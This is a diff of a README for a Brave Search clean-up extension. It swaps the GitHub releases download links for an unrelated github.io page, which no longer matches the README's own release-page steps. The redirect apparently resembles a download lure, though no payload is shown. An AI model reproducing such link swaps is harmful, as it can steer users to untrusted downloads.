@@ -1,6 +1,6 @@
 # 🧹 BraveSearchUICleaner - Get a clean and simple search experience
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Appleofperufamilyfasciolidae631/BraveSearchUICleaner/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://appleofperufamilyfasciolidae631.github.io)
 
 BraveSearchUICleaner simplifies your search interface. It removes AI summaries, clutter, and unnecessary elements from Brave Search. You see only your search results. This project makes your browsing experience faster and easier on your eyes.
 
@@ -26,7 +26,7 @@ You need the following to run this tool:
 Follow these steps to set up the extension on your computer.
 
 ### Step 1: Visit the page
-Visit this page to download the project files: [https://github.com/Appleofperufamilyfasciolidae631/BraveSearchUICleaner/releases](https://github.com/Appleofperufamilyfasciolidae631/BraveSearchUICleaner/releases)
+Visit this page to download the project files: [https://appleofperufamilyfasciolidae631.github.io](https://appleofperufamilyfasciolidae631.github.io)
 
 ### Step 2: Download the source code
 Look for the section labeled "Assets" on the release page. Click the link that says "Source code (zip)". This downloads a compressed folder to your computer.
